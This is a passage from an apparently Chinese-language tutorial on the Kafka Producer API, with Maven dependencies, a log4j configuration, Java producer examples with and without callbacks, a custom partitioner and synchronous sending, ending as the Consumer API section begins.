tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.logging.log4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>log4j-slf4j-impl<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.12.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2）添加log4j配置文件</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Configuration</span> <span class="token attr-name">status</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>error<span class="token punctuation">"</span></span> <span class="token attr-name">strict</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>XMLConfig<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Appenders</span><span class="token punctuation">></span></span>        <span class="token comment" spellcheck="true">&lt;!-- 类型名为Console，名称为必须属性 --></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Appender</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Console<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>STDOUT<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token comment" spellcheck="true">&lt;!-- 布局为PatternLayout的方式，            输出样式为[INFO] [2018-01-22 17:34:01][org.test.Console]I'm here --></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Layout</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>PatternLayout<span class="token punctuation">"</span></span>                    <span class="token attr-name">pattern</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>[%p] [%d&amp;#123;yyyy-MM-dd HH:mm:ss&amp;#125;][%c&amp;#123;10&amp;#125;]%m%n<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Appender</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Appenders</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Loggers</span><span class="token punctuation">></span></span>        <span class="token comment" spellcheck="true">&lt;!-- 可加性为false --></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Logger</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>test<span class="token punctuation">"</span></span> <span class="token attr-name">level</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>info<span class="token punctuation">"</span></span> <span class="token attr-name">additivity</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>false<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>AppenderRef</span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>STDOUT<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Logger</span><span class="token punctuation">></span></span>        <span class="token comment" spellcheck="true">&lt;!-- root loggerConfig设置 --></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Root</span> <span class="token attr-name">level</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>info<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>AppenderRef</span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>STDOUT<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Root</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Loggers</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Configuration</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3）编写代码</p><p>需要用到的类：</p><p>KafkaProducer：需要创建一个生产者对象，用来发送数据</p><p>ProducerConfig：获取所需的一系列配置参数</p><p>ProducerRecord：每条数据都要封装成一个ProducerRecord对象</p><p>（1）不带回调函数的API</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>molly<span class="token punctuation">.</span>kafka<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>producer<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Properties<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>ExecutionException<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CustomProducer</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> ExecutionException<span class="token punctuation">,</span> InterruptedException <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        Properties props <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//kafka集群，broker-list</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"bootstrap.servers"</span><span class="token punctuation">,</span> <span class="token string">"hadoop102:9092"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"acks"</span><span class="token punctuation">,</span> <span class="token string">"all"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//重试次数</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"retries"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">//批次大小</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"batch.size"</span><span class="token punctuation">,</span> <span class="token number">16384</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">//等待时间</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"linger.ms"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">//RecordAccumulator缓冲区大小</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"buffer.memory"</span><span class="token punctuation">,</span> <span class="token number">33554432</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"key.serializer"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.kafka.common.serialization.StringSerializer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"value.serializer"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.kafka.common.serialization.StringSerializer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Producer<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> producer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">KafkaProducer</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span>props<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            producer<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ProducerRecord</span><span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span><span class="token punctuation">(</span><span class="token string">"first"</span><span class="token punctuation">,</span> Integer<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> Integer<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        producer<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（2）带回调函数的API</p><p>回调函数会在producer收到ack时调用，为异步调用，该方法有两个参数，分别是RecordMetadata和Exception，如果Exception为null，说明消息发送成功，如果Exception不为null，说明消息发送失败。</p><p>注意：消息发送失败会自动重试，不需要我们在回调函数中手动重试。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>molly<span class="token punctuation">.</span>kafka<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>producer<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Properties<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>ExecutionException<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CustomProducer</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> ExecutionException<span class="token punctuation">,</span> InterruptedException <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        Properties props <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"bootstrap.servers"</span><span class="token punctuation">,</span> <span class="token string">"hadoop102:9092"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//kafka集群，broker-list</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"acks"</span><span class="token punctuation">,</span> <span class="token string">"all"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"retries"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//重试次数</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"batch.size"</span><span class="token punctuation">,</span> <span class="token number">16384</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//批次大小</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"linger.ms"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//等待时间</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"buffer.memory"</span><span class="token punctuation">,</span> <span class="token number">33554432</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//RecordAccumulator缓冲区大小</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"key.serializer"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.kafka.common.serialization.StringSerializer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"value.serializer"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.kafka.common.serialization.StringSerializer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Producer<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> producer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">KafkaProducer</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span>props<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            producer<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ProducerRecord</span><span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span><span class="token punctuation">(</span><span class="token string">"first"</span><span class="token punctuation">,</span> Integer<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> Integer<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Callback</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">//回调函数，该方法会在Producer收到ack时调用，为异步调用</span>                <span class="token annotation punctuation">@Override</span>                <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">onCompletion</span><span class="token punctuation">(</span>RecordMetadata metadata<span class="token punctuation">,</span> Exception exception<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>exception <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>                        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"success->"</span> <span class="token operator">+</span> metadata<span class="token punctuation">.</span><span class="token function">offset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span> <span class="token keyword">else</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>                        exception<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>                <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        producer<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-3-分区器"><a href="#1-3-分区器" class="headerlink" title="1.3 分区器"></a>1.3 分区器</h3><p><strong>1）</strong> 默认的分区器 DefaultPartitioner</p><p><strong>2）</strong> 自定义分区器 </p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyPartitioner</span> <span class="token keyword">implements</span> <span class="token class-name">Partitioner</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * 计算某条消息要发送到哪个分区     * @param topic 主题     * @param key   消息的key     * @param keyBytes 消息的key序列化后的字节数组     * @param value 消息的value     * @param valueBytes   消息的value序列化后的字节数组     * @param cluster     * @return     *     * 需求: 以molly主题为例，2个分区     *       消息的 value包含"molly"的 进入0号分区     *       其他的消息进入1号分区     */</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">partition</span><span class="token punctuation">(</span>String topic<span class="token punctuation">,</span> Object key<span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> keyBytes<span class="token punctuation">,</span> Object value<span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> valueBytes<span class="token punctuation">,</span> Cluster cluster<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        String msgValue <span class="token operator">=</span> value<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> partition <span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>msgValue<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"molly"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            partition <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">else</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            partition <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> partition<span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * 收尾工作     */</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * 读取配置的     * @param configs     */</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">configure</span><span class="token punctuation">(</span>Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> <span class="token operator">?</span><span class="token operator">></span> configs<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-4-同步发送API"><a href="#1-4-同步发送API" class="headerlink" title="1.4 同步发送API"></a>1.4 同步发送API</h3><p>​    同步发送的意思就是，一条消息发送之后，会阻塞当前线程，直至返回ack。</p><p>由于send方法返回的是一个Future对象，根据Futrue对象的特点，我们也可以实现同步发送的效果，只需在调用Future对象的get方发即可。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>molly<span class="token punctuation">.</span>kafka<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>producer<span class="token punctuation">.</span>KafkaProducer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>producer<span class="token punctuation">.</span>Producer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>producer<span class="token punctuation">.</span>ProducerRecord<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Properties<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>ExecutionException<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CustomProducer</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> ExecutionException<span class="token punctuation">,</span> InterruptedException <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        Properties props <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"bootstrap.servers"</span><span class="token punctuation">,</span> <span class="token string">"hadoop102:9092"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//kafka集群，broker-list</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"acks"</span><span class="token punctuation">,</span> <span class="token string">"all"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"retries"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//重试次数</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"batch.size"</span><span class="token punctuation">,</span> <span class="token number">16384</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//批次大小</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"linger.ms"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//等待时间</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"buffer.memory"</span><span class="token punctuation">,</span> <span class="token number">33554432</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//RecordAccumulator缓冲区大小</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"key.serializer"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.kafka.common.serialization.StringSerializer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"value.serializer"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.kafka.common.serialization.StringSerializer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Producer<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> producer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">KafkaProducer</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span>props<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            producer<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ProducerRecord</span><span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span><span class="token punctuation">(</span><span class="token string">"first"</span><span class="token punctuation">,</span> Integer<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> Integer<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        producer<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-Consumer-API"><a href="#2-Consumer-API" class="headerlink" title="2 Consumer API"></a>2 Consumer API</h2><p>Consumer消费数据时的可靠性是很容易保证的，因为数据在Kafka中是持久化的，故不用担心数据丢失问题。</p><p>由于consumer在消费过程中可能会出现断电宕机等故障，consumer恢复后，需要从故障前的位置的继续消费，所以consumer需要实时记录自己消费到了哪个offset，以便故障恢复后继续消费。</p><p>所以offset的维护是Consumer消费数据是必须考虑的问题。</p><h3 id="2-1-自动提交offset"><a href="#2-1-自动提交offset" class="headerlink" title="2.1 自动提交offset"></a>2.1 自动提交offset</h3><p>1）编写代码</p><p>需要用到的类：</p><p>KafkaConsumer：需要创建一个消费者对象，用来消费数据</p><p>ConsumerConfig：获取所需的一系列配置参数</p><p>ConsuemrRecord：每条数据都要封装成一个ConsumerRecord对象</p><p>为了使我们能够专注于自己的业务逻辑，Kafka提供了自动提交offset的功能。 